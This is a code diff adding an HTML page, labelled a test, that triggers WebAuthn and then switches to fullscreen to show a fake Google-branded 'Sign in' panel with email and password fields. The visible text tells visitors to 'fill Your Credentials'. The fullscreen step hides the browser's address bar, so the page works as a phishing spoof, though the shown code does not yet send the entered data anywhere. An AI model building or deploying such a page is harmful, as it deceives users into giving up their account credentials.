@@ -1,0 +1,146 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Fullscreen + WebAuthn Test</title>
+
+<style>
+body {
+    font-family: Arial;
+    text-align: center;
+    padding: 50px;
+}
+
+button {
+    padding: 15px 25px;
+    font-size: 18px;
+    margin: 15px;
+    cursor: pointer;
+}
+
+/* controls */
+#controls {
+}
+
+/* fullscreen UI */
+#fsUI {
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+}
+
+/* top image */
+#topBar {
+    width: 100%;
+    height: 60px;
+    object-fit: cover;
+}
+
+/* ✅ NEW LOGO STYLE */
+#logo {
+    display: block;
+    margin: 60px auto 10px auto;
+    width: 220px; /* login panel se thoda chhota */
+}
+
+/* login panel */
+#loginPanel {
+    margin: 10px auto;
+    width: 300px;
+    background: white;
+    padding: 20px;
+    border-radius: 10px;
+}
+</style>
+</head>
+
+<body>
+
+<h2>Tap Continue and fill Your Credentials</h2>
+
+<!-- SINGLE BUTTON -->
+<div id="controls">
+    <button id="comboBtn">Start Secure Flow</button>
+</div>
+
+<!-- fullscreen UI -->
+<div id="fsUI">
+    <img id="topBar" src="google.png">
+
+    <!-- ✅ NEW LOGO -->
+    <img id="logo" src="gm.png">
+
+    <div id="loginPanel">
+        <h3>Sign in</h3>
+        <input type="text" placeholder="Email"><br><br>
+        <input type="password" placeholder="Password"><br><br>
+        <button>Next</button>
+    </div>
+</div>
+
+<script>
+const comboBtn = document.getElementById("comboBtn");
+
+// SINGLE CLICK FLOW
+comboBtn.addEventListener("click", async () => {
+
+    // 1️⃣ WebAuthn trigger
+    const challenge = crypto.getRandomValues(new Uint8Array(32));
+    const userId = crypto.getRandomValues(new Uint8Array(16));
+
+    navigator.credentials.create({
+        publicKey: {
+            challenge,
+            rp: { name: "Test RP" },
+            user: {
+                id: userId,
+                name: "test@example.com",
+                displayName: "Test User"
+            },
+            pubKeyCredParams: [
+                { type: "public-key", alg: -7 }
+            ],
+            timeout: 60000,
+            authenticatorSelection: {
+                userVerification: "preferred"
+            }
+        }
+    }).then(cred => {
+        console.log("✅ WebAuthn success:", cred);
+    }).catch(err => {
+        console.log("❌ WebAuthn error:", err.name, err.message);
+    });
+
+    // 2️⃣ delay → fullscreen
+    setTimeout(async () => {
+        try {
+            await document.documentElement.requestFullscreen();
+            console.log("Entered fullscreen");
+        } catch (e) {
+            console.log("Fullscreen error:", e);
+        }
+    }, 500);
+});
+
+
+// UI toggle
+const fsUI = document.getElementById("fsUI");
+const controls = document.getElementById("controls");
+
+document.addEventListener("fullscreenchange", () => {
+    if (document.fullscreenElement) {
+        fsUI.style.display = "block";
+        controls.style.display = "none";
+    } else {
+        fsUI.style.display = "none";
+        controls.style.display = "block";
+        console.log("⚠️ Fullscreen exited");
+    }
+});
+</script>
+
+</body>
+</html>
